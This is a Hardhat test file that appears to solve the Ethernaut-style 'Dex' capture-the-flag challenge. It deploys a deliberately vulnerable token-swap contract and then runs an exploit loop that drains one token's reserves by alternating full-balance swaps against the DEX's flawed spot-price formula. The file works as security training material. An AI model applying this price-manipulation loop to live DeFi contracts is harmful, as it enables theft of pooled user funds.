const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Dex', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const DexFactory = await ethers.getContractFactory('Dex');
            const SwappableTokenFactory = await ethers.getContractFactory('SwappableToken');
            this.target = DexFactory.attach("");
            this.token1 = SwappableTokenFactory.attach(await this.target.token1());
            this.token2 = SwappableTokenFactory.attach(await this.target.token2());
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const DexFactory = await ethers.getContractFactory('Dex', deployer);
            const SwappableTokenFactory = await ethers.getContractFactory('SwappableToken', deployer);
            this.target = await DexFactory.deploy();
            this.token1 = await SwappableTokenFactory.deploy(this.target.address, "Token 1", "TKN1", 110); // 100 for dex, 10 for attacker
            this.token2 = await SwappableTokenFactory.deploy(this.target.address, "Token 2", "TKN2", 110); // 100 for dex, 10 for attacker
            /** set token for dex contract **/
            let setokenTX = await this.target.connect(deployer).setTokens(this.token1.address, this.token2.address); await setokenTX.wait();
            /** send tokens to dex **/
            let approveTX = await this.target.connect(deployer).approve(this.target.address, 100); await approveTX.wait();
            let addToken1TX = await this.target.connect(deployer).addLiquidity(this.token1.address, 100); await addToken1TX.wait();
            let addToken2TX = await this.target.connect(deployer).addLiquidity(this.token2.address, 100); await addToken2TX.wait();
            /** send tokens to attacker **/
            let sendToken1TX = await this.token1.connect(deployer).transfer(attacker.address, 10); await sendToken1TX.wait();
            let sendToken2TX = await this.token2.connect(deployer).transfer(attacker.address, 10); await sendToken2TX.wait();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const calculateExactAmountIn = (exactOut, from, to) => {
            return parseInt(exactOut*from/to);
        }
        /** approve token1 and token2 for DEX contract **/
        console.log(`\t approving 1M tokens of Token1 and Token2 for DEX...`);
        let approveTX = await this.target.connect(attacker).approve(this.target.address, 1000000); await approveTX.wait();
        /** repeatedly swap all token1 to token2 ,then all token2 to token1.. **/
        console.log(`\t repeatedly swap...`);
        let amount1, amount2, swapAmount, dexBalance, swapTX, count=0;
        while (true) {
            if (parseInt(await this.token1.balanceOf(this.target.address)) == 0 || parseInt(await this.token2.balanceOf(this.target.address)) == 0) break;
            if (count%2==0){
                /** token1 to token2 **/
                amount1 = await this.token1.balanceOf(attacker.address);
                amount2 = await this.token2.balanceOf(attacker.address);
                console.log(`\t swap token1 to token2...`);
                console.log(`\t token2 before: ${amount2}`);
                swapAmount = parseInt(await this.target.getSwapPrice(this.token1.address, this.token2.address, amount1));
                dexBalance = parseInt(await this.token2.balanceOf(this.target.address));
                if (swapAmount > dexBalance) {
                    let fromBalance = await this.token1.balanceOf(this.target.address);
                    let toBalance = await this.token2.balanceOf(this.target.address);
                    swapAmount = calculateExactAmountIn(dexBalance, fromBalance, toBalance);
                }else{ swapAmount = amount1 }
                swapTX = await this.target.connect(attacker).swap(this.token1.address, this.token2.address, swapAmount); await swapTX.wait();
                amount2 = await this.token2.balanceOf(attacker.address);
                console.log(`\t token2 after  ${amount2}`);
            }else{
                /** token2 to token1 **/
                console.log(`\t swap token1 to token2...`);
                amount2 = await this.token2.balanceOf(attacker.address);
                amount1 = await this.token1.balanceOf(attacker.address);
                console.log(`\t token1 before: ${amount1}`);
                swapAmount = parseInt(await this.target.getSwapPrice(this.token2.address, this.token1.address, amount2));
                dexBalance = parseInt(await this.token1.balanceOf(this.target.address));
                if (swapAmount > dexBalance) {
                    let fromBalance = await this.token2.balanceOf(this.target.address);
                    let toBalance = await this.token1.balanceOf(this.target.address);
                    swapAmount = calculateExactAmountIn(dexBalance, fromBalance, toBalance);
                }else{ swapAmount = amount2 }
                swapTX = await this.target.connect(attacker).swap(this.token2.address, this.token1.address, swapAmount); await swapTX.wait();
                amount1 = await this.token1.balanceOf(attacker.address);
                console.log(`\t token1 after  ${amount1}`);
            }
            count++;
        }
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(0).to.be.oneOf([
            parseInt(await this.token1.balanceOf(this.target.address)),
            parseInt(await this.token2.balanceOf(this.target.address))
        ]);
    });
});